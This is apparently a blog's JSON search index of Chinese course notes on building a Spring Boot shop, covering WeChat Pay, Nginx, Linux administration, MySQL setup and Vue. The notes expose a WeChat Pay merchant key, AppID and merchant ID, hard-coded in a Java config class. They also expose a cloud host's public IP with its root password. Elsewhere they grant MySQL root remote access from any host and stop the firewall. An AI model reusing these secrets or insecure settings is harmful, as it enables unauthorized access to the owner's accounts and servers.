&amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=\"roleid\" sqlStatement=\"Mysql\" identity=\"true\"/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;!-- &lt;table tableName=\"tb_permissions\"&gt;--&gt; &lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=\"perid\" sqlStatement=\"Mysql\" identity=\"true\"/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;/context&gt; &lt;/generatorConfiguration&gt; 7.3 将配置文件设置到逆向工程的maven插件 7.4 执行逆向生成","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"微信支付","slug":"04-锋迷商城-随堂笔记/05-微信支付/微信支付","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:19:16.713Z","comments":true,"path":"posts/13.html","link":"","permalink":"https://bigbug888.github.io/posts/13.html","excerpt":"","text":"微信支付 通过微信平台为商家提供代收款服务 1.微信支付业务—商户注册微信支付业务https://pay.weixin.qq.com/index.php/core/home/login?return_url=%2F 商户编号：1497984412 商户账号AppID：wx632c8f211f8122c6 商户Key：sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC 2.申请支付订单—商户向支付平台申请支付链接 支付订单，并不是用户提交的商品订单，而是商户向微信支付平台申请的支付链接 2.1 导入微信支付的依赖 wxpay的maven依赖 &lt;dependency&gt; &lt;groupId&gt;com.github.wxpay&lt;/groupId&gt; &lt;artifactId&gt;wxpay-sdk&lt;/artifactId&gt; &lt;version&gt;0.0.3&lt;/version&gt; &lt;/dependency&gt; 2.2 创建微信支付配置类，配置商户信息 创建一类，实现WxPayConfig接口 重写三分方法，分别设置商户AppID\\商户ID\\商户密钥 public class MyPayConfig implements WXPayConfig { @Override public String getAppID() { return \"wx632c8f211f8122c6\"; } @Override public String getMchID() { return \"1497984412\"; } @Override public String getKey() { return \"sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC\"; } @Override public InputStream getCertStream() { return null; } @Override public int getHttpConnectTimeoutMs() { return 0; } @Override public int getHttpReadTimeoutMs() { return 0; } } 2.3 设置支付订单的参数HashMap&lt;String,String&gt; data = new HashMap&lt;&gt;(); data.put(\"body\",\"咪咪萧条\"); //商品描述 data.put(\"out_trade_no\",orderId); //使用当前用户订单的编号作为当前支付交易的交易号 data.put(\"fee_type\",\"CNY\"); //支付币种 data.put(\"total_fee\",\"1\"); //支付金额 data.put(\"trade_type\",\"NATIVE\"); //交易类型 data.put(\"notify_url\",\"/pay/success\"); //设置支付完成时的回调方法接口 2.4 申请支付链接WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); //发送请求 orderInfo.put(\"payUrl\",resp.get(\"code_url\"));","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"Nginx","slug":"04-锋迷商城-随堂笔记/07-Nginx/Nginx","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:20:27.367Z","comments":true,"path":"posts/15.html","link":"","permalink":"https://bigbug888.github.io/posts/15.html","excerpt":"","text":"一、Nginx介绍1.1 为什么要使用Nginx1.1 静态资源访问 前端项目在进行服务器部署的时候，如果基于tomcat则不能满足并发的需求，因此我们需要一种能够处理更高并发的适用于静态资源的服务器 1.2 代理服务器-负载均衡1.2 Nginx介绍 Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器 Nginx 是基于HTTP协议的请求/响应（部署web项目） —- 静态资源服务器 Nginx可以作为反向代理服务器 —- 负载均衡服务器(代理服务器) Nginx特点： 稳定性极强，可以实现7*24不间断运行 提供简洁、直观的配置 占用内存很小、并发能力很强（5w+） 二、Nginx下载、安装及配置2.1 windows环境2.1 .1下载http://nginx.org/en/download.html 2.1.2 解压到指定目录解压即可 2.1.3 运行及访问 执行根路径下的nginx.exe nginx 默认端口 80,所以直接访问 ： http://localhost 2.2 Linux环境三、Nginx配置 配置文件说明 #user nobody; # 配置处理器个数（应不大于cpu核心数） worker_processes 1; # 配置nginx运行日志文件 error_log logs/error.log; # 配置Nginx进程的进程号的存储文件 # pid logs/nginx.pid; # 配置nginx连接数，数值越大并发能力越强 events { worker_connections 2000; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { # 配置nginx端口号 listen 80; server_name localhost; # 地址映射 #location / { # root html; # index index.html index.htm; #} location / { root fmall-static; index index.html index.htm; } # 指定错误页面 error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } 四、锋迷商城—前端部署 安装Nginx 将前端项目fmall-static拷贝到nginx的根目录 修改nginx.conf： location / { root fmall-static; index index.html index.htm; }","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"Linux","slug":"04-锋迷商城-随堂笔记/06-Linux/Linux","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:19:43.020Z","comments":true,"path":"posts/14.html","link":"","permalink":"https://bigbug888.github.io/posts/14.html","excerpt":"","text":"一、Linux介绍 学习背景：Java项目生产环境绝大多数都是基于Linux进行搭建的 1.1 Linux系统介绍 Linux和windows一样是一个操作系统（就如同android和ios手机系统一样） Linux是一套免费使用、可以自由传播的类unix操作系统 Linux可以支持多用户、多任务、支持多线程及多CPU的操作系统 Linux通常作为专用服务器系统（应用服务器、数据库服务器）使用——Java 1.2 Linux系统特点 系统稳定性比windows要好（宕机概率比较低） 完全开源、用户可以进行自由的系统裁剪、灵活性高、使用成本低 Linux核心防火墙组件性能高、配置简单、安全性高 Linux提供了纯命令行系统（也可以带有界面）、进一步减小系统本身的开销 Linux使用非常广泛、技术社区比较发达、学习资源也很丰富 综上，Linux比windows更适合用于服务器系统 1.3 Linux系统版本 RedHat （RedHat公司发行的Linux版本：效率高、扩展性好、高可靠性） SUSE （德国的SUSE公司发行的版本） 红旗Linux CentOS （基于RedHat源码编译而成、完全开源） DEbian（有很对社区进行维护的非官方版本，商业可用性不高） Ubuntu（乌班图，基于DEbian的发行，提供了优化后的桌面系统） 二、虚拟机 如何获取一个Linux操作系统？ 基于硬件安装Linux（双系统） 安装虚拟机，基于虚拟机安装linux系统 租用云主机（linux） 2.1 虚拟机介绍 使用软件模拟硬件环境——从当前的计算机资源中分离出一部分可独立运行的资源 2.2 下载安装vmware 详细步骤参考VMware workstation下载、安装、激活.pdf文档 2.2.1 下载Download VMware Workstation Pro 2.2.2 安装傻瓜式安装 安装完成之后重启计算机 2.2.3 激活计算机重启之后，第一次运行vmware时输入序列号进行激活 2.3 创建虚拟机 桥接网络和转换网络 桥接网络 转换网络 2.4 安装CentOS参考虚拟机创建及linux安装.pdf 打开终端：application – Terminal(终端) 查看网络配置： ifconfig 切换用户： su username ## 输入密码 （低级权限用户切换到高级权限用户是需要输入密码的） 重启Linux reboot 系统状态切换 ## 切换到命令行模式 init 3 ## 切换到桌面模式 init 5 三、Linux远程工具3.1 Linux资源管理工具 xftp SSH 3.1.1 xftp下载https://www.netsarang.com/zh/xftp-download/ 3.1.2 安装傻瓜式安装 3.1.3 创建xftp与linux的连接 3.2 Linux远程终端3.2.1 xshell下载3.2.2 xshell安装傻瓜式安装 3.2.3 创建xshell与Linux的连接 四、云主机 使用虚拟机的限制： 1.虚拟机共享宿主机的资源 2.虚拟机的故障率比较高 3.虚拟机也是基于内网的网络 4.1 什么是云主机？ 云主机就是使用一种虚拟化技术在一台主机中虚拟出多个“独立”的主机部分，能够实现单机多用户，每个部分都可以作为单独的主机来管理和使用。 4.2 购买云主机 推荐阿里和腾讯 腾讯：云+校园 https://cloud.tencent.com/act/campus 阿里：24岁 https://developer.aliyun.com/plan/grow-up 4.3 云主机管理 阿里云/腾讯云都提供了一个管理系统，用户对云主机进行配置和管理 阿里云控制中心： https://console.aliyun.com 4.3.1 轻量级服务器管理 常规管理 防火墙设置 4.3.2 ECS服务器管理 常规管理 安全组管理（防火墙） 4.4 远程工具连接云主机 云主机公网IP：47.110.38.44 root帐号的密码：Lxl19950902 4.4.1 xftp远程连接云主机4.4.2 xshell远程连接云主机五、Linux常用操作指令5.1 如何学习Linux？ Linux的文件系统 Linux文件管理 目录：进退、创建、删除 文件：创建与编辑、复制和粘贴、移动和删除、压缩和解压 用户及权限的管理 在windows中，通常都是自己使用自己的机器，很少出现多个人使用同一台机器的情况，所以在我们日常使用windows都只有一个账号，也就不会关注不同账号之间的权限问题 但是在linux系统使用过程中，通常是作为服务器系统使用，所以通常都会在一个Linux系统中创建多个不同权限的用户（root就是一个超级管理员身份的用户） 软件管理 软件安装 软件配置 软件卸载 5.2 Linux文件系统 Linux系统不同于windows，在Linux系统中没有盘符，根路径用”/“表示 [root@theo ~]# cd / [root@theo /]# ls bin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var [root@theo /]# 目录 说明 bin 系统文件夹，存放linux的系统文件 sbin 超级管理员的系统命令 boot 系统所需目录（系统启动相关文件） etc 存放系统配置相关的文件（环境变量） lib/lib64 library 存放系统所需的依赖库 home 一般用户所在文件夹（此目录包含了所有普通用户的用户目录） root 超级管理员目录（root用户目录） media 媒体(光驱) mnt 挂载（U盘、移动硬盘） tmp、opt 临时的文件存储目录，比如日志存储在tmp或者opt中 usr 用户目录，我们通常安装的软件、用户的一些文件都在此目录下 run srv sys var proc dev 系统相关目录 5.3 Linux系统指令语法示例： tar -zcvf b.tar otp_src_20.1 指令 [选项] 参数 指令，决定了当前的动作 选项，可有可无（对于有些指令，选项是必须的） “-” 表示短选项，一个字母代表一个选项 “–”表示长选项，一个单词代表一个选项 参数，指令正常执行所需的数据 man指令（manual:说明书） man 指令 点击q退出说明书 5.4 文件管理5.4.1 目录操作指令 进入文件夹及退出文件夹 cd 目录名称 进入指定的目录（当我们输入目录名称的时候，可以通过Tab进行自动补全） ## 进入到Linux系统跟路径 cd / ## 进入到当前用户的目录（如果是root用户则进入到/root,如果是其他用户则进入到/home/中的用户目录） cd ~ cd .. 退出当前目录 pwd （print working directory）查看当前路径 绝对路径和相对路径 ##绝对路径： cd 指令参数的路径如果是以/开头，表示从系统的根路径下去查找 cd /path ##相对路径：cd 指令参数的路径如果没有/，则表示从当前目录去查找 cd path 显示当前目录下的文件列表 ls 显示文件列表 ls -a 显示当前目录下所有文件列表（包括隐藏文件） ls -l 显示当前目录下文件列表的详细信息 ll 显示文件列表详细信息（相当于 ls -l） 目录的创建和删除 mkdir 目录名 在当前目录下创建新的目录（创建一级目录） mkdir -p 目录A/目录B 连同父级目录一起创建 创建目录 rm -r 目录 删除当前目录（需要确认） rmdir 目录 专门用于删除目录 rm -rf 目录 删除当前目录（强制删除，无需确认） -r recursive 递归（删除目录及目录中的内容） -f force 强制 5.4.2 文件操作指令 创建和修改文件 vi （visual） 文件编辑 vim （visual improved） 增强文件编辑 # 打开目标文件；如果此文件不存在，则表示先创建此文件再打开 vi a.txt 当文件打开之后，点击”i”/“a”进入到编辑状态； 完成编辑之后，点击“esc”退出编辑状态； 退出文件： :q 如果未对文件进行任何修改—退出文件 :q! 对文件内容进行了修改，但是不保存退出 :wq 保存对文件的修改并退出 vim +行号 文件名 进入到当前文件编辑器，光标指向指定的行号 阅读文件 cat 文件名 阅读文件内容，适合阅读小文件 more 文件名 阅读文件，带有翻页（回车一次往下一行，不支持向上翻页） less 文件名 阅读文件，适合阅读打文件；可以上下翻页（PgDn/PgUp），退出less阅读模式点击q 在less阅读模式下，输入“?查询内容”可以向上查询数据；输入“/查询内容”可以实现向下查询内容 查询文件和查询内容 find 文件名 在当前目录查找文件/目录 find 文件名 目录 在指定的目录中查找文件 find -name 文件名 在当前目录包括当前目录子目录中查找文件 grep -n 内容 文件 在指定的文件中查找指定的内容 管道命令 管道命令：多个命令的组合 特征：前面的命令必须有输出，后面的命令使用这个输出 实例：cat a.txt | grep Hello| grep 23 删除文件 rm -rf 文件名 复制和移动 cp 文件 目录 mv 文件 目录 5.4.3 文件压缩和解压 windows系统下压缩文件通常是zip、rar等格式；Linux系统压缩文件通常为tar.gz(tar包) tar 指令 完成linux系统的文件压缩和解压 tar -zcvf 压缩 # 对test1目录进行压缩，压缩到test1.tar文件 tar -zcvf test1.tar test1 # 将test1和test2进行压缩，压缩到test.tar文件 tar -zcvf test.tar test1 test2 tar -zxvf 解压 # 解压指定的压缩文件 tar -zxvf test.tar 指令说明： z 用gzip工具进行压缩或者解压 x extract 解压缩 c compress 压缩 v verbose显示压缩/解压过程详细信息 f file 文件 5.5 用户及权限管理 Linux系统支持多用户，采用用户组的形式管理多个用户（root用户就在root用户组） 在Linux中提供了严格的权限管理（用户对文件/目录的操作权限，root用户默认具有所有文件的操作权限） 对文件的操作权限：读、写、执行 用户组 groupadd team1 创建用户组 groupdel team1 删除用户组 用户 useradd -g 用户组 用户名 创建新用户 passwd 用户名 设置用户密码 userdel 用户名 删除用户 切换用户 su 用户名 切换至其他普通用户 su 切换至管理员（需要输入超级管理员密码） 权限管理 说明： 第一个字符表示文件|目录 ，d表示目录，-表示文件 r 可读(4) w可写(2) x 可执行(1) 第一个rwx：表示当前文件的所有者拥有的权限 第二个rwx：表示和文件所有者同组用户拥有的权限 第三个rwx：表示不同组用户拥有的权限 修改权限 chmod chmod 775 文件名 5.6 系统与进程 查询进程top ps -ef | grep java 通过进程名称查找进程 根据端口查找进程 lsof -i:port 通过端口查询进程信息 如果此指令不可以用，则需要通过 yum install -y lsof安装指令 CentOS6 Ubuntu没有此指令 netstat -apn | grep port 通过端口查询进程信息 （CentOS6） 强杀进程 kill -9 PID 通过进程编号强杀进程 系统注销和重启 logout 注销 reboot 重启 六、软件管理相关的指令（wget， rpm，yum）6.1 wget指令 我们在linux中安装软件，首先要完成软件安装包的下载；获取Linux系统中软件的安装包，我们有两种途径： 在windows中进行下载（百度搜索—下载），通过xftp将windows现在的安装包上传到Linux系统 直接在linux系统中，通过wget进行下载 6.1.1 wget介绍 wget是Linux系统中一个下载文件的工具，Linux系统自带 6.1.2 wget使用 wget [option] url mysql 下载： wget http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm 6.2 rpm指令6.2.1 rpm介绍RPM(Red-Hat Package Manager) 是一款Linux系统的软件包的管理器，可以完成Linux系统中应用的安装、卸载 6.2.2 rpm指令 查询：rpm -qa | grep 关键字 卸载：rpm -e --nodeps 软件名称 安装：rpm -ivh 安装包.rpm mysql安装: rpm -ivh mysql57-community-release-el7-10.noarch.rpm 更新：rpm -Uvh 安装包.rpm 6.3 yum指令6.3.1 yum介绍 yum(全称：Yellow Dog Updater，Modified)，基于RPM包管理，能够从指定的服务器自动下载rpm并安装，可以自定处理依赖关系，一次安装所有的依赖软件，无需一个个的下载安装。 6.3.2 yum指令 yum [-y] install http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm yum list yum list 列出系统中所有的包 yum [-y] install rpm包 下载并安装rpm包 yum update rpm包 yum remove rpm包 七、JDK安装（离线安装）7.1 下载JDK（Linux版）官网/云盘 （jdk.tar.gz） 7.2 使用xftp将下载的安装包上传到linux的/usr/local目录 7.3 解压JDK安装包 7.4 查看JDK工具 JDK目录结构 7.5 配置环境变量 进入到/etc目录，找到profile文件 编辑profile文件 ： vim profile 在profile文件最后配置以下内容 export JAVA_HOME=/usr/local/jdk1.8.0_221 export JRE_HOME=$JAVA_HOME/jre export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib export PATH=$JAVA_HOME/bin:$PATH 7.6 让配置生效# 让配置生效 [root@theo etc]# source /etc/profile # 显示jdk版本 [root@theo etc]# java -version java version \"1.8.0_221\" Java(TM) SE Runtime Environment (build 1.8.0_221-b11) Java HotSpot(TM) 64-Bit Server VM (build 25.221-b11, mixed mode) 八、Tomcat安装8.1 下载离线tar略 8.2 上传到Linux略 8.3 解压tar文件tar -zxvf apache-tomcat-8.5.46.tar.gz 8.4 启动tomcat[root@theo apache-tomcat-8.5.46]# cd /usr/local/apache-tomcat-8.5.46/bin [root@theo bin]# ls bootstrap.jar catalina-tasks.xml commons-daemon.jar configtest.sh digest.sh shutdown.bat startup.sh tool-wrapper.bat version.sh catalina.bat ciphers.bat commons-daemon-native.tar.gz daemon.sh setclasspath.bat shutdown.sh tomcat-juli.jar tool-wrapper.sh catalina.sh ciphers.sh configtest.bat digest.bat setclasspath.sh startup.bat tomcat-native.tar.gz version.bat [root@theo bin]# ./startup.sh Using CATALINA_BASE: /usr/local/apache-tomcat-8.5.46 Using CATALINA_HOME: /usr/local/apache-tomcat-8.5.46 Using CATALINA_TMPDIR: /usr/local/apache-tomcat-8.5.46/temp Using JRE_HOME: /usr/local/jdk1.8.0_221/jre Using CLASSPATH: /usr/local/apache-tomcat-8.5.46/bin/bootstrap.jar:/usr/local/apache-tomcat-8.5.46/bin/tomcat-juli.jar Tomcat started. 8.5 关闭防火墙# 查看防火墙状态 [root@theo bin]# systemctl status firewalld ● firewalld.service - firewalld - dynamic firewall daemon Loaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled) Active: inactive (dead) Docs: man:firewalld(1) # 关闭防火墙 [root@theo bin]# systemctl stop firewalld # 启动防火墙 [root@theo bin]# systemctl start firewalld 8.6 访问云主机上的tomcat 安全组设置：要让tomcat的端口允许访问 http://47.96.11.185:8080/ 8.7 停止tomcat[root@theo bin]# lsof -i:8080 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME java 30394 root 53u IPv4 64248 0t0 TCP *:webcache (LISTEN) [root@theo bin]# kill -9 30394 九、安装MySQL9.1 在线安装（推荐）9.1.1 通过wget指令下载mysql的rpm文件[root@theo local]# pwd /usr/local [root@theo local]# ls aegis apache-tomcat-8.5.46 bin etc games include jdk1.8.0_221 lib lib64 libexec sbin share src [root@theo local]# wget http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm 9.1.2 rpm安装mysql[root@theo local]# rpm -ivh mysql57-community-release-el7-10.noarch.rpm 9.1.3 通过yum安装mysql服务[root@theo local]# yum -y install mysql-community-server 9.1.4 加入开机启动[root@theo local]# systemctl enable mysqld 9.1.5 启动MySQL服务[root@theo local]# systemctl start mysqld [root@theo local]# lsof -i:3306 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME mysqld 8430 mysql 17u IPv6 70095 0t0 TCP *:mysql (LISTEN) 或者使用： service mysqld start 5.1.5 停止MySQL服务[root@theo local]# systemctl stop mysqld 或者使用：service mysqld stop 9.2 离线下载安装9.2.1 在windows下载mysql安装文件（2个）MySQL-server-5.6.45-1.el7.x86_64.rpm MySQL-client-5.6.45-1.el7.x86_64.rpm 9.2.2 将安装包上传到linux(/usr/local) xftp 9.2.3 清除centos自带的mariaDB包[root@theo local]# rpm -qa | grep mariadb [root@theo local]# rpm -e --nodeps mariadb-libs-... 9.2.4 安装mysql的服务和客户端[root@theo local]#rpm -ivh MySQL-server-5.6.45-1.el7.x86_64.rpm [root@theo local]#rpm -ivh MySQL-client-5.6.45-1.el7.x86_64.rpm 9.3 MySQL基本使用# 1.查找初始密码 cat /var/log/mysqld.log | grep password # 2.登录到mysql [root@theo log]# mysql -uroot -p Enter password: # 3.修改密码 # 3-1 设置密码的检查机制为LOW set global validate_password_policy=LOW # 3-2 修改密码 set password=password('admin123'); # 4.授权远程登录 GRANT ALL PRIVILEGES on *.* to 'root'@'%' IDENTIFIED by 'admin123' WITH GRANT OPTION; flush PRIVILEGES; 十、安装Nginx（在线安装）10.1 安装编译工具（nginx安装之前需要编译）[root@theo local]# yum install -y gcc gcc-c++ 10.2 安装PCRE# 1.下载 [root@theo local]# wget http://downloads.sourceforge.net/project/pcre/pcre/8.35/pcre-8.35.tar.gz # 2.解压 [root@theo local]# tar -zxvf pcre-8.35.tar.gz # 3.进入pcre目录 [root@theo local]# cd pcre-8.35 # 4.配置 [root@theo pcre-8.35]#./configure # 5.编译安装 [root@theo pcre-8.35]# make &amp;&amp; make install 10.3 安装SSL库[root@theo pcre-8.35]# cd /usr/local [root@theo local]# wget http://www.openssl.org/source/openssl-1.0.1j.tar.gz [root@theo local]# tar -zxvf openssl-1.0.1j.tar.gz [root@theo local]# cd openssl-1.0.1j [root@theo openssl-1.0.1j]# ./config [root@theo openssl-1.0.1j]# make &amp;&amp; make install 10.4 安装zlib库[root@theo openssl-1.0.1j]# cd /usr/local [root@theo local]# wget http://zlib.net/zlib-1.2.11.tar.gz [root@theo local]# tar -zxvf zlib-1.2.11.tar.gz [root@theo local]# cd zlib-1.2.11 [root@theo zlib-1.2.11]# ./configure [root@theo zlib-1.2.11]# make &amp;&amp; make install 10.5 安装Nginx[root@theo zlib-1.2.11]# cd /usr/local [root@theo local]# wget http://nginx.org/download/nginx-1.16.1.tar.gz [root@theo local]# tar -zxvf nginx-1.16.1.tar.gz [root@theo local]# mkdir -p server/nginx [root@theo local]# cd nginx-1.16.1 [root@theo nginx-1.16.1]# ./configure --prefix=/usr/local/server/nginx --with-http_stub_status_module --with-http_ssl_module --with-pcre=/usr/local/pcre-8.35 [root@theo nginx-1.16.1]# make &amp;&amp; make install # 如果在配置过程中出现了以下错误: ./configure: error: SSL modules require the OpenSSL library. You can either do not enable the modules, or install the OpenSSL library into the system, or build the OpenSSL library statically from the source with nginx by using --with-openssl=&lt;path&gt; option. # 执行：yum -y install openssl openssl-devel 10.6 配置Nginx vim /usr/local/server/nginx/conf/nginx.conf 10.7 启动Nginx 10.8 访问Nginxhttp://47.96.11.185/imgs/a.jpg","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"Vue","slug":"04-锋迷商城-随堂笔记/04-vue/VUE","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:18:47.846Z","comments":true,"path":"posts/12.html","link":"","permalink":"https://bigbug888.github.io/posts/12.html","excerpt":"","text":"一、VUE简介1.1 使用jQuery的复杂性问题 使用jQuery进行前后端分离开发，既可以实现前后端交互（ajax）,又可以完成数据渲染； 存在的问题：jQuery需要通过HTML标签拼接、DOM节点操作完成数据的显示，开发效率低且容易出错，渲染效率较低 vue 是继jQuery之后的又一优秀的前端框架：专注于前端数据的渲染——语法简单、渲染效率高 1.2 VUE简介1.2.1 前端框架 前端三要素：HTML、CSS、JavaScript HTML决定网页结构 CSS决定显示效率 JavaScript决定网页功能（交互、数据显示） UI框架： Bootstrap amazeUI Layui JS框架： jQuery（jQuery UI） React angular nodejs—-后端开发 vue 集各种前端框架的优势发展而来 1.2.2 MVVM 项目结构经历的三个阶段： 后端MVC 我们就可以理解为单体架构，流程控制是由后端控制器来完成 前端MVC 前后端分离开发，后端只负责接收响应请求 MVVM 前端请求后端接口，后端返回数据，前端接收数据，并将接收的数据设置“VM”,HTML从vm取值 M model 数据模型 指的是后端接口返回的数据 V view 视图 VM ViewModel 视图模型 数据模型与视图之间的桥梁，后端返回的model转换前端所需的vm，视图层可以直接从vm中提取数据 MVC MVVM 二、 vue的入门使用 Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合. 2.1 vue的引入 离线引用：下载vue的js文件，添加到前端项目，在网页中通过script标签引用vue.js文件 CDN引用： &lt;script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"&gt;&lt;/script&gt; 2.2 入门案例&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;&lt;/title&gt; &lt;script src=\"js/vue.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; 从vm中获取的数据为：{{str}} &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ str:\"从前有座山\" } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 三、 vue的语法3.1 基本类型数据和字符串{{code}} {{str}} ------------------------- data:{ code:10, str:\"test\" } 3.2 对象类型数据 支持ognl语法 {{stu.stuNum}} {{stu.stuName}} ----------------------------- data{ stu:{ stuNum:\"100001\", stuName:\"张三\", stuGender:\"M\", stuAge:20 } } 3.3 条件 v-if&lt;label v-if=\"stu.stuGender=='M'\"&gt;男&lt;/label&gt;&lt;br/&gt; ------------------------------------------------------- data:{ stu:{ stuNum:\"100001\", stuName:\"张三\", stuGender:\"M\", stuAge:20 } } 3.4 循环 v-for&lt;table border=\"1\" cellspacing=\"0\" width=\"400\"&gt; &lt;tr&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;学号&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;/tr&gt; &lt;tr v-for=\"s,index in stus\"&gt; &lt;td&gt;{{index+1}}&lt;/td&gt; &lt;td&gt;{{s.stuNum}}&lt;/td&gt; &lt;td&gt;{{s.stuName}}&lt;/td&gt; &lt;td&gt; &lt;label v-if=\"s.stuGender == 'M'\"&gt;男&lt;/label&gt; &lt;label v-if=\"s.stuGender == 'F'\"&gt;女&lt;/label&gt; &lt;/td&gt; &lt;td&gt;{{s.stuAge}}&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; --------------------------------------------------------------------- data:{ stus:[ { stuNum:\"100001\", stuName:\"张大三\", stuGender:\"M\", stuAge:23 }, { stuNum:\"100002\", stuName:\"张中三\", stuGender:\"M\", stuAge:22 }, { stuNum:\"100003\", stuName:\"张小三\", stuGender:\"F\", stuAge:20 } ] } 3.5 v-bind绑定标签属性 v-bind: 可简写为 : &lt;input type=\"text\" v-bind:value=\"str\"/&gt; &lt;img :src=\"stu.stuImg\"/&gt; ------------------------------------ data{ str:\"从前有座山\", stu:{ stuImg:\"img/01.jpg\" } } 3.6 表单标签的双向绑定 v-model 只能使用在表单输入标签 v-model:value 可以简写为 v-model &lt;input type=\"text\" v-model:value=\"str\"/&gt; &lt;input type=\"text\" v-model=\"str\"/&gt; ------------------------------------ data{ str:\"从前有座山\" } 四、vue实例 每个使用vue进行数据渲染的网页文档都需要创建一个Vue实例 —— ViewModel 4.1 Vue实例的生命周期 vue实例生命周期——vue实例从创建到销毁的过程 创建vue实例（初始化data、加载el） 数据挂载（将vue实例data中的数据渲染到网页HTML标签） 重新渲染（当vue的data数据发生变化，会重新渲染到HTML标签） 销毁实例 4.2 钩子函数 为了便于开发者在vue实例生命周期的不同阶段进行特定的操作，vue在生命周期四个阶段的前后分别提供了一个函数，这个函数无需开发者调用，当vue实例到达生命周期的指定阶段会自动调用对应的函数。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;label v-once&gt;{{str}}&lt;/label&gt;&lt;br/&gt; &lt;label&gt;{{str}}&lt;/label&gt;&lt;br/&gt; &lt;input type=\"text\" v-model=\"str\"/&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{}, beforeCreate:function(){ //1.data初始化之前执行，不能操作data }, created:function(){ //2.data初始化之后执行，模板加载之前，可以修改/获取data中的值 console.log(this.str); //this.str = \"山里有座庙\"; }, beforeMount:function(){ //3.模板加载之后，数据初始渲染（挂载）之前，可以修改/获取data中的值 //this.str = \"庙里有口井\"; }, mounted:function(){ //4.数据初始渲染（挂载）之后，可以对data中的变量进行修改，但是不会影响v-once的渲染 //this.str = \"井里有只蛙\"; }, beforeUpdate:function(){ //5.数据渲染之后，当data中的数据发生变化触发重新渲染，渲染之前执行此函数 // data数据被修改之后，重新渲染到页面之前 console.log(\"-----\"+this.str); this.str = \"从前有座山2\"; }, updated:function(){ //6.data数据被修改之后，重新渲染到页面之后 //this.str = \"从前有座山3\"; }, beforeDestroy:function(){ //7.实例销毁之前 }, destroyed:function(){ //8.实例销毁之后 } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 五、计算属性和侦听器5.1 计算属性 data中的属性可以通过声明获得，也可以通过在computed通过计算获得 特性：计算属性所依赖的属性值发生变化会影响计算属性的值同时发生变化 示例 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;input type=\"text\" v-model=\"str1\"/&gt;&lt;br/&gt; &lt;input type=\"text\" v-model=\"str2\"/&gt;&lt;br/&gt; {{str3}} &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ str1:\"千锋\", str2:\"武汉\" }, computed:{ str3:function(){ return this.str1+this.str2; } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 5.2 侦听器 侦听器，就是data中属性的监听器，当data中的属性值发生变化就会触发侦听器函数的执行 &lt;!DOCTYPE html&gt; &lt;html&gt; 